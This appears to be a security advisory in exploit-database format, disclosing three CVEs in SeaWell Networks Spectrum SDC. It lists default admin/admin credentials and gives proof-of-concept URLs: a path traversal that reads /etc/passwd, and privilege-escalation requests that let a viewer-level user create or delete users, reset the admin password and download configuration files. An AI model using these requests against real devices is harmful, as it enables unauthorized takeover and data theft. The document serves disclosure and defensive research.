@@ -1,0 +1,105 @@
+# Exploit Title: [SeaWell Networks Spectrum - Multiple Vulnerabilities]
+# Discovered by: Karn Ganeshen
+# Vendor Homepage: [http://www.seawellnetworks.com/spectrum/]
+# Versions Reported: [Spectrum SDC 02.05.00, Build 02.05.00.0016]
+ 
+CVE-ID:
+CVE-2015-8282
+CVE-2015-8283
+CVE-2015-8284
+
+About SeaWell Networks Spectrum
+
+Session Delivery Control
+
+SeaWell set out to improve the way operators control, monetize and scale their IP video offerings, to meet the growing subscriber demands for video delivered to smartphones, tablets and game consoles.
+
+The result – Spectrum – is what we call a “Multiscreen 2.0” Session Delivery Controller.
+
+Spectrum is high-performance, carrier-grade software that takes ABR video and repackages it – on-the-fly – into any other protocol, including Apple HLS, Adobe HDS, Microsoft Smooth Streaming and MPEG-DASH.
+
+http://www.seawellnetworks.com/spectrum/
+
+Affected version
+Spectrum SDC 02.05.00
+Build 02.05.00.0016
+Copyright (c) 2015 SeaWell Networks Inc.
+
+A. CWE-255: Credentials Management
+CVE-2015-8282
+
+Weak, default login credentials - admin / admin
+
+B. CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
+CVE-2015-8283
+
+The configure_manage.php module accepts a file parameter which takes an unrestricted file path as input, allowing an attacker (non-admin, low- privileged user) to read arbitrary files on the system.
+
+PoC:
+
+https://IP/configure_manage.php?action=download_config&file=../../../../../../../../../etc/passwd
+
+C. CWE-285: Improper Authorization
+CVE-2015-8284
+
+A low privileged, non-admin user, with only viewer privileges, can perform administrative functions, such as create, update, delete a user (including admin user), or access device's configuration files (policy.xml, cookie_config.xml, systemCfg.xml). The application lacks Authorization controls to restrict any non-admin users from performing admin functions.
+
+The application users can have admin or viewer privilege levels. Admin has full access to the device. Viewer has access to very restricted functions.
+
+It is possible for a viewer priv user to perform admin functions.
+
+PoC:
+
+Add new user [Admin function only]
+
+GET /system_manage.php?username=viewer&password=viewer&password=viewer&userlevel=1&action=add_user&ekey=&LActiveRow= HTTP/1.1
+
+https://IP/system_manage.php?username=viewer1&password=viewer&password=viewer&userlevel=9&action=add_user&ekey=&LActiveRow=
+
+Here
+
+admin -> userlevel=9
+viewer -> userlevel=1
+
+Create new user with Admin privs
+Log in as viewer - try create new admin user - viewer1
+
+https://IP/system_manage.php?username=viewer1&password=viewer&password=viewer&userlevel=9&action=add_user&ekey=&LActiveRow=
+
+<result><returnCode>0</returnCode><returnMsg>Success</returnMsg><loggedIn>1</loggedIn><payload/></result>
+
+Delete user
+
+https://IP/system_manage.php?username=viewer1&password=&password=&userlevel=9&action=delete_user&ekey=4&LActiveRow=sys_Luser_4
+
+Modify existing user (including admin)
+log in as viewer - try change system (admin) user
+
+https://IP/system_manage.php?username=system&password=&password=&userlevel=9&action=delete_user&ekey=4&LActiveRow=sys_Luser_4
+
+<result><returnCode>0</returnCode><returnMsg>Success</returnMsg><loggedIn>1</loggedIn><payload/></result>
+
+Change Admin password
+log in as viewer - try change admin pass
+
+https://IP/system_manage.php?username=admin&password=admin1&password=admin1&userlevel=9&action=update_user&ekey=3&LActiveRow=sys_Luser_3
+
+<result><returnCode>0</returnCode><returnMsg>Success</returnMsg><loggedIn>1</loggedIn><payload/></result>
+
+Downloading configuration xml files
+
+viewer priv user has no access/option to config xmls via GUI. It is possible to download the configs by calling the url directly
+
+Access policy config xml
+https://IP/configure_manage.php?action=download_config&file=policy.xml
+
+Access cookie config xml
+https://IP/configure_manage.php?action=download_config&file=cookie_config.xml
+
+Access system config xml
+https://IP/configure_manage.php?action=download_config&file=systemCfg.xml
+
++++++
+-- 
+Best Regards,
+Karn Ganeshen
